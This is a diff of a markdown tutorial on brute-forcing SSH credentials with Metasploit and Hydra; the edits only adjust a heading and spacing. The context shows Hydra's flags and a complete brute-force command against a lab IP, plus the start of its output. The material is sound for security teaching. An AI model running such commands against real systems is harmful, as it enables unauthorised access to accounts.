@@ -1,4 +1,4 @@
-### Bruteforce SSH Credentials using Hydra or Metasploit
+# Bruteforce SSH Credentials using Hydra or Metasploit
 
 ## Metasploit
 The first method we will try out today involves one of Metasploit's auxiliary scanners. First, start the PostgreSQL database with the following command.
@@ -228,12 +228,14 @@ Example:  hydra -l user -P passlist.txt ftp://192.168.0.1
 ```
 
 Hydra contains a range of options, but today we will be using the following:
+
 - The -L flag, which specifies a list of login names.
 - The -P flag, which specifies a list of passwords.
 - ssh://172.16.1.102 — our target and protocol.
 - The -t flag set to 4, which sets the number of parallel tasks to run.
 Once we kick it off, the tool will display the status of the attack:
 `~$ hydra -L users.txt -P passwords.txt ssh://172.16.1.102 -t 4`
+
 ```
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-09 15:12:47
